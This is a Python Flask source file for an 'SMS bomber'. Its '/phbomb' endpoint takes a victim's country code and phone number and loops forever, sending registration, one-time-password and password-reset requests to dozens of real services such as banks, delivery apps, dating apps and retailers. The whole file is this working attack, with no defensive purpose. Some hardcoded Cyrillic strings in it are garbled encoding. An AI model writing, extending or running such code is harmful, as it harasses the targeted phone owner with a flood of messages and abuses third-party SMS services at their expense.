from flask import Flask,request
import requests
import random

app = Flask(__name__)
@app.route('/phbomb',methods=['GET'])
def FuckTheFucker():
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        x=x
    cc=str(request.args['cc'])
    pn=str(request.args['nm'])
    iteration = 0
    _email = "fucker"+f'{iteration}'+'@gmail.com'
    email = "fucker"+f'{iteration}'+'@gmail.com'
    _phone=cc+pn
    _phone9 = _phone[1:]
    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]    
    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
    _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]    
    _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    num = _phone
    numplus = '+' + num
    while True:
        try:
            requests.post("http://mobile-api.metropolis.moscow/v1/register",data = {'phone': num})
        except :
            pass
        try:
            requests.post("http://mobile-api.metropolis.moscow/v1/send-code", data = {'phone': num})
        except :
            pass
    
        try:
            requests.post("http://api.rozamira-azs.ru/v1/auth", data = {'login': num})
        except :
            pass
            
        try:
            requests.post("http://app.maheev.org/LMA/registration/registrate_client?birthday=14.02.2001&patronymic=Dd&phone="+num+"&surname=Ffr&sex=1&name=Df")
        except :
            pass
    
                
        try:
            requests.post("http://milano-engels.ru/ajax/loginPhone?ssid=d7f1f5ba-578d-4380-9adc-5031ce3aa0be&mobileApp=true&restaurant=edebbe6f-fa2a-4a49-bfb5-e301deee47c5&phone=+"+num+"&country=RU")
        except :
            pass    
        try:
            requests.get("https://suandshi.ru/mobile_api/register_mobile_user?phone="+num[1:])
        except:
            pass

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data = {'phone': num , 'device': 'Windows+v.43+Chrome+v.7453451', 'app_version': '870'})
        except :
            pass
        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json = {'phone': num , 'otpId': 0})
        except :
            pass

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data = {'phone': numplus})
        except:
            pass
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data = {'phone': num })
        except :
            pass
        try:
            requests.post('https://findclone.ru/register?phone={}'.format(num))
        except :
            pass
        try:
            requests.post('https://api.kfc.com/api/users/v1/user.verify', json = {"device":{"deviceId":"new_kfc_web_site","deviceType":"mobile"}, "createdAt":"2020-02-15T16:48:04.172Z", "phone": numplus})
        except :
            pass    
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': numplus})
        except:
            pass
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus})
        except :
            pass
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus})
        except :
            pass
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num))
        except:
            pass
        try:
            requests.post('https://kapibaras.ru/api/lk/sendCode', json = {"phone": numplus,"city":1})
        except:
            pass
        try:
            requests.post('https://api.mtstv.ru/v1/users', json = {"msisdn": num})
        except :
            pass
        try:
            requests.post('https://api-user.privetmir.ru/api/v2/send-code', data = {"back_url": "/register/step-2/", "scope": "register-user reset-password", "login": numplus, "checkApproves":"Y","approve1":"on","approve2":"on"})
        except:
            pass

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html?qip=1206982388733687&lang=ru&source=0', data = {"l": num})
        except :
            pass
        
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data = {"phone": numplus})
        except :
            pass
        
    
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data = {"phone":num})
        except :
            pass

        try:
            requests.post('https://api.iconjob.co/api/auth/verification_code', data = {"phone": num})
        except :
            pass
        
    
        try:
            requests.get('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=' + num)
        except :
            pass

        try:
            requests.get('https://zoloto585.ru/registraciya_karty/sms.php?get_sms=1&type=new&fn=%D0%92%D0%90%D0%A1%D0%98%D0%9B%D0%AC%D0%95%D0%92%D0%90&sn=%D0%98%D0%A0%D0%98%D0%9D%D0%90&tn=%D0%9A%D0%90%D0%A0%D0%98%D0%9D%D0%9E%D0%92%D0%9D%D0%90&sex=1&dd=12.12.1990&sl=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0&phone=%2B' + num + '&email=edfsfsdgf%40mail.ru')
        except :
            pass

        try:
            requests.post("http://194.58.90.105/v1/me/registration?phone=" + num,timeout=2)
        except :
            pass
        
        
           
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone})
        except :
            pass
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        except :
            pass    
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        except :
            pass

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        except :
            pass
        
    
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
        except :
            pass
    
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        except :
            pass
    
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
        except :
            pass
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        except :
            pass
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        except:
            pass
        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
        except :
            pass
    
            
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        except :
            pass
    
        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
        except :
            pass
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
        except:
            pass
    
            
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½', 'lastName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        except :
            pass    
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        except :
            pass
    
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
        except :
            pass    
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        except :
            pass
    
        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'ÃÂÃÂÃÂÃÂ¾ÃÂÃÂ»ÃÂÃÂÃÂÃÂ·ÃÂÃÂ¾ÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂÃÂÃÂµÃÂÃÂ»ÃÂÃÂ.ÃÂÃÂÃÂÃÂ°ÃÂÃÂÃÂÃÂ²ÃÂÃÂºÃÂÃÂ°ÃÂÃÂÃÂÃÂ°ÃÂÃÂ¤ÃÂÃÂ¸ÃÂÃÂ·ÃÂÃÂ¸ÃÂÃÂºÃÂÃÂ°','params':{'phone':_phone},'id':'1'})
        except :
            pass
        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½','middleName':'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²ÃÂÃÂ¸ÃÂÃÂ','lastName':'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        except:
            pass
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        except:
            pass
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
        except :
            pass

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        except :
            pass
        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        except :
            pass
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        except :
            pass
        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        except:
            pass
        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
        except:
            pass
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except:
            pass
            
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
        except :
            pass    
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
        except :
            pass
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
        except :
            pass 
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
        except :
            pass
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + _phone})
        except:
            pass
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
        except :
            pass
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
        except:
            pass    
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
        except :
            pass
        try:
            requests.post('https://plink.tech/register/',json={"phone": _phone})
        except :
            pass
        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
        except :
            pass
        try:
            requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
        except :
            pass
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
        except :
            pass
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
        except:
            pass
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
        except :
            pass
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
        except :
            pass
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
        except :
            pass
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        except :
            pass
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
        except :
            pass
            
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        except :
            pass
    
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone})
        except :
            pass    
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except :
            pass

        try:
            headers = {'Host': 'm.netmeds.com','content-length': '76','accept': '*/*','origin': 'https://m.netmeds.com','x-requested-with': 'XMLHttpRequest','save-data': 'on','user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','referer': 'https://m.netmeds.com/customer/account/login/','accept-encoding': 'gzip, deflate, br','accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6','cookie': '_ga=GA1.3.185497001.1558720330'}
            data = {'register_mobileno': pn,'logintype': 'Otp','uniq_identy': 'quWqfunF','forget_pwd': 'N'}
            requests.post('https://m.netmeds.com/sociallogin/popup/nmsgetcode/', headers=headers, data=data)
        except :
            pass
        try:
            headers = {'Host': 'client-api.goomo.com','origin': 'https://www.goomo.com','client': 'm-web','x-goomo-platform': 'mWeb','dnt': '1','content-type': 'application/json','accept': '*/*','referer': 'https://www.goomo.com/hotels','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9'}
            data = {"email":"fakeemail@gmail.com","phone_number":pn,"country_code":cc}
            requests.post('https://client-api.goomo.com/v2/phone_confirmation/verify_user', headers=headers, json=data)
        except :
            pass
        try:
            headers = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.5','Connection': 'keep-alive','Content-Length': '34','Content-Type': 'application/x-www-form-urlencoded','Host': 'www.oriyamatrimony.com','Referer': 'https://www.oriyamatrimony.com/','User-Agent': 'Mozilla/5.0 (Windows NT 8.1; Win64; x64; rv:59.0) Gecko/20 Firefox/56.0','X-Requested-With': 'XMLHttpRequest'}
            data = {'countrycode': cc, 'mobileno': pn}
            requests.post('https://www.oriyamatrimony.com/login/mobileappsms-homepage.php', headers=headers, data=data)            
        except :
            pass
        try:
            headers = {'host': 'www.flipkart.com','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0','accept': '*/*','accept-language': 'en-US,en;q=0.5','accept-encoding': 'gzip, deflate, br','referer': 'https://www.flipkart.com/','x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop','origin': 'https://www.flipkart.com','connection': 'keep-alive','Content-Type': 'application/json; charset=utf-8'}
            data = {"loginId":["+"+cc+pn],"supportAllStates":True}
            requests.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data)
        except :
            pass
        try:
            cookies = {'Cookie:T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050','SWAB': 'build-44be9e47461a74d737914207bcbafc30','lux_uid': '155867904381892986','AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1','AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI','s_cc': 'true','SN': '2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078','gpv_pn': 'HomePage','gpv_pn_t': 'Homepage','S': 'd1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==','s_sq': '%5B%5BB%5D%5D'}
            headers = {'Host': 'www.flipkart.com','Connection': 'keep-alive','Content-Length': '60','X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop','Origin': 'https://www.flipkart.com','Save-Data': 'on','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36','Content-Type': 'application/x-www-form-urlencoded','Accept': '*/*','Referer': 'https://www.flipkart.com/','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',}
            data = {'loginId': '+'+cc+pn,'state': 'VERIFIED','churnEmailRequest': 'false'}
            requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
        except :
            pass
        try:
            headers = {'Host': 'www.ref-r.com','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0','Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Language': 'en-US,en;q=0.5','Accept-Encoding': 'gzip, deflate, br','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With': 'XMLHttpRequest','Content-Length': '26','DNT': '1','Connection': 'keep-alive',}
            data = {'mobile': pn,'submit': '1','undefined': ''}
            requests.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data)
        except :
            pass
        try:
            headers = {'X-DROID-VERSION': '4.12.5','API-Version': '2.0','user-agent': 'samsung SM-G9350 0 4.4.2','client-version': 'Android-4.12.5','X-DROID-VERSION-CODE': '158','Accept': 'application/json','client-name': 'Practo Android App','Content-Type': 'application/x-www-form-urlencoded','Host': 'accounts.practo.com','Connection': 'Keep-Alive','Content-Length': '96'}
            data = {'client_name': 'Practo Android App','mobile': '+'+cc+pn,'fingerprint': '','device_name':'samsung+SM-G9350'}
            requests.post( "https://accounts.practo.com/send_otp", headers=headers, data=data)
        except :
            pass
        try:
            headers = {'Host': 'api.cloud.altbalaji.com','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','Origin': 'https://lite.altbalaji.com','Save-Data': 'on','User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Referer': 'https://lite.altbalaji.com/subscribe?progress=input','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',}
            data = {"country_code":cc,"phone_number":pn}
            requests.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data)
        except:
            pass
        try:
            cookies = {'Cookie:frontend': 'a27mn3h3irt1rlt6i55s93p9r5','frontend_cid': '8zqBBzwQTMIt9UKg','_BEAMER_USER_ID_gADrycBn12870': 'c9fe4f7d-b421-4bad-9cf2-0a4db716dff4','G_ENABLED_IDPS': 'google',}
            headers = {'Host': 'www.aala.com','Connection': 'keep-alive','Accept': 'application/json, text/javascript, */*; q=0.01','Origin': 'https://www.aala.com','X-Requested-With': 'XMLHttpRequest','Save-Data': 'on','User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Referer': 'https://www.aala.com/','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5',}
            data = {'email': cc+pn,'firstname': 'M4xPr0','lastname': 'M4xPr0'}
            requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
        except :
            pass
        try:
            data = {'method': 'SMS','countryCode': 'id','phoneNumber': cc+pn,'templateID': 'pax_android_production'}
            requests.post('https://api.grab.com/grabid/v1/phone/otp', data=data)
        except :
            pass
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": cc+pn, "SignupForm[device_type]": 3})
        except :
            pass
        
        

if __name__ == "__main__":
    app.run()